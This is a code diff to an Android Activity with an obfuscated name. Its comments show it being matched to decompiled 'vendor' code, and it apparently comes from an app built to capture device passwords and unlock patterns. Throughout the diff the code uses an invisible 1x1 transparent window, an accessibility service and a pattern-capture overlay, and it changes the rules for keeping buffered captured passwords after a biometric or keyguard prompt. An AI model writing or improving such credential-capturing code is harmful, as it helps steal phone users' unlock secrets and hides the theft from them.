@@ -80,12 +80,17 @@ class syuqattwmgit : Activity() {
                     if (success) {
                         Log.d(TAG, "验证成功，confirmAndSaveLastCipher 结果: ${ccm.confirmAndSaveLastCipher()}")
                     } else {
-                        // vendor: JADX guards this with PatternCaptureManager (C0337a3) overlay/pattern check:
-                        //   if (sm0Var.hasOverlay() || sm0Var.patternData.isNotEmpty()) → discard
-                        //   else → skip discard ("验证失败但无覆盖层和图案数据，跳过 discard")
-                        // For now, always discard as safer default
-                        ccm.discardBufferedPassword()
-                        Log.w(TAG, "验证失败/取消，丢弃缓冲密码")
+                        // vendor syuqattwmgit.java:108-115 — 条件 discard:
+                        //   只在 overlay 存在或有 pattern 数据时 discard，否则保留缓冲密码
+                        val pco = com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay.instance
+                        val hasOverlay = pco?.captureState == 1 // captureState != 0 means active
+                        val hasPatternData = pco?.capturedPoints?.isNotEmpty() == true
+                        if (hasOverlay || hasPatternData) {
+                            ccm.discardBufferedPassword()
+                            Log.w(TAG, "验证失败/取消，丢弃缓冲密码（覆盖层存在或有图案数据）")
+                        } else {
+                            Log.v(TAG, "验证失败但无覆盖层和图案数据，跳过 discard")
+                        }
                     }
                     ccm.stopListening()
                     Log.d(TAG, "已关闭密码捕获监听模式")
@@ -184,9 +189,10 @@ class syuqattwmgit : Activity() {
                 return
             }
         }
-        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
-        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
-        credentialIntent.addFlags(0x800000) // FLAG_ACTIVITY_NO_ANIMATION
+        // vendor syuqattwmgit.java:186-188 — SINGLE_TOP + CLEAR_TOP + EXCLUDE_FROM_RECENTS
+        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)          // vendor: 536870912
+        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)           // vendor: 67108864
+        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS) // vendor: 8388608
         MyAccessibilityService.Companion.setVerifyPauseMode()
         sendBroadcast(Intent("com.storm.safe.rock.BIOMETRIC_PROMPT_SHOWN").setPackage(packageName))
         Log.d(TAG, "已发送 BIOMETRIC_PROMPT_SHOWN 广播 (KeyguardManager)")
@@ -231,25 +237,29 @@ class syuqattwmgit : Activity() {
         }
         setContentView(view)
 
-        // Configure transparent window
+        // Configure transparent window — vendor syuqattwmgit.java:233-247
         val attrs = window.attributes
         attrs.dimAmount = 0.0f
         attrs.x = 0
         attrs.y = 0
         attrs.width = 1
         attrs.height = 1
-        attrs.gravity = android.view.Gravity.START or android.view.Gravity.TOP or android.view.Gravity.CENTER_VERTICAL
+        // vendor L239: attributes.gravity = 8388661 = Gravity.END | Gravity.TOP
+        attrs.gravity = android.view.Gravity.END or android.view.Gravity.TOP
         window.attributes = attrs
         window.decorView.setBackgroundColor(0)
-        window.setFlags(
-            0x400, // FLAG_WATCH_OUTSIDE_TOUCH — JADX: Segment.SHARE_MINIMUM (1024)
-            0x400
-        )
-        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE)
+        // vendor L242: setFlags(Segment.SHARE_MINIMUM=1024, 1024) — FLAG_ALT_FOCUSABLE_IM (0x400)
+        window.setFlags(0x400, 0x400)
+        // vendor L243: addFlags(32) = FLAG_NOT_TOUCH_MODAL
+        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL)
+        // vendor L244: addFlags(16) = FLAG_NOT_TOUCHABLE
         window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
-        window.addFlags(0x4000000)  // FLAG_ACTIVITY_CLEAR_TOP equiv for window
-        window.addFlags(0x8000000)  // FLAG_ACTIVITY_SINGLE_TOP equiv for window
-        window.addFlags(WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN)
+        // vendor L245: addFlags(67108864) = FLAG_TRANSLUCENT_STATUS
+        window.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS)
+        // vendor L246: addFlags(134217728) = FLAG_TRANSLUCENT_NAVIGATION
+        window.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
+        // vendor L247: addFlags(262144) = FLAG_IGNORE_CHEEK_PRESSES
+        window.addFlags(WindowManager.LayoutParams.FLAG_IGNORE_CHEEK_PRESSES)
 
         Log.v(TAG, "syuqattwmgit onCreate 完成")
     }
@@ -276,7 +286,13 @@ class syuqattwmgit : Activity() {
         } catch (e: Exception) {
             Log.w(TAG, "启用密码捕获失败: ${e.message}")
         }
+        // vendor RunnableC0941o6.java:733 (case 24) — isFinishing/isDestroyed guard
         Handler(Looper.getMainLooper()).postDelayed({
+            if (isFinishing || isDestroyed) {
+                Log.w(TAG, "Activity 已销毁，跳过 BiometricPrompt")
+                return@postDelayed
+            }
+            Log.v(TAG, "API 版本: ${Build.VERSION.SDK_INT}")
             if (Build.VERSION.SDK_INT >= 30) {
                 showBiometricPrompt()
             } else {
